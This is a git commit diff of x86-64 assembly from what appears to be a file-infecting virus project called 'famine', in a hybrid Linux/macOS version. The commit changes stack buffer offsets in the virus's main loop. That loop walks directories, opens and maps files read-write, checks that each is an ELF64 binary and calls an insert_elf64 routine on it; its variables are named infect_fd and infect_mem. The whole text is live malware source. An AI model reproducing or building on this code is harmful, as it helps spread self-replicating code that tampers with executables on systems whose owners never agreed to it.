2be25f82bd953fc3141bb6af23742e7ac902f06c
Alexandr SARANDI <sarandi.alex@gmail.com>
2019-07-10 21:43:33 -0700

    updated buffer addresses on stack in hybrid version

--- hybrid/famine.asm
+++ hybrid/famine.asm
@@ -1,4 +1,4 @@
-; famine hybrid - size 1106 bytes
+; famine hybrid - size 1139 bytes
 
 %include "famine.inc"
 
@@ -55,12 +55,12 @@ _start:
                 test        eax, eax
                 jl          .nextdir                
 
-                mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
+                mov         [rsp-0x100], rax                    ;rsp-0x100 = directory_fd
 
-.readdir:       lea         r10, [rsp-0x28]                     ;long *basep for macos
-                mov         rdx, BUF_SIZE
-                lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                mov         rdi, [rsp-0x30]                     ;directory fd
+.readdir:       lea         r10, [rsp-0x108]                    ;long *basep for macos
+                mov         rdx, 0x400                          ;buf size
+                lea         rsi, [rsp-0x800]                    ;buffer for getdents() is at rsp-0x800
+                mov         rdi, [rsp-0x100]                    ;directory fd
                 mov         rax, __NR_getdents
                 translate_syscall
                 jc          .closedir
@@ -70,7 +70,7 @@ _start:
                 xor         r13, r13
                 mov         r12, rax
 .file:
-                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
+                lea         rdi, [rsp-0x800]
                 add         rdi, r13
 
                 xor         edx, edx
@@ -99,7 +99,7 @@ _start:
                 jl          .file
                 jmp         .readdir
 
-.closedir:      mov         rdi, [rsp-0x30]
+.closedir:      mov         rdi, [rsp-0x100]                    ; file descriptor
                 mov         rax, __NR_close
                 translate_syscall
 .nextdir:
@@ -123,7 +123,7 @@ process:                                                        ; expecting file
                                                                 ; directory in r14
                 mov         rsi, r14
                 mov         rax, rdi
-                lea         rdi, [rsp - ((BUF_SIZE * 2) + LOCAL_VARS)]
+                lea         rdi, [rsp - 0xc00]                  ; buf for filename
                 mov         rdx, rdi                            ; concat directory and filename
 
 .dirname:       movsb
@@ -148,26 +148,26 @@ process:                                                        ; expecting file
                 test        eax, eax
                 jl          .return
 
-                mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd
+                mov         [rsp-0x118], rax                    ; rsp-0x118 = infect_fd
 
-                lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
-                mov         rdi, [rsp-0x48]
+                lea         rsi, [rsp - 0x300]                  ; rsp-0x300 = fstat buf
+                mov         rdi, rax
                 mov         rax, __NR_fstat
                 translate_syscall
                 cmp         rax, 0
                 jnz         .close
 
-                mov         rax, qword [rsp - (0x148-0x30)]     ; linux st_size
+                mov         rax, qword [rsp - (0x300-0x30)]     ; linux st_size
                 test        r15b, r15b
                 jz          .st_size
-                mov         rax, qword [rsp - (0x148-0x48)]     ; macos st_size
+                mov         rax, qword [rsp - (0x300-0x48)]     ; macos st_size
 .st_size:
-                mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize
+                mov         [rsp-0x120], rax                    ; rsp-0x120 = infect_fsize
                 cmp         rax, 0x1000                         ; file too small
                 jl          .close
 
                 xor         r9, r9
-                mov         r8, [rsp-0x48]
+                mov         r8, [rsp-0x118]
                 mov         r10, MAP_SHARED
                 mov         rdx, PROT_READ | PROT_WRITE
                 mov         rsi, rax
@@ -177,7 +177,7 @@ process:                                                        ; expecting file
                 cmp         rax, -4095
                 jae         .close
 
-                mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
+                mov         [rsp-0x128], rax                    ;rsp-0x128 = infect_mem
                 mov         rdi, rax
 
                 call        is_valid_elf64
@@ -193,12 +193,12 @@ process:                                                        ; expecting file
 
 .insert_elf64:  call        insert_elf64
 
-.unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
-                mov         rdi, [rsp-0x58]                     ; infect_mem
+.unmap:         mov         rsi, [rsp-0x120]                    ; infect_fsize
+                mov         rdi, [rsp-0x128]                    ; infect_mem
                 mov         rax, __NR_munmap
                 translate_syscall
 
-.close:         mov         rdi, [rsp-0x48]
+.close:         mov         rdi, [rsp-0x118]
                 mov         rax, __NR_close
                 translate_syscall
 .return:        ret
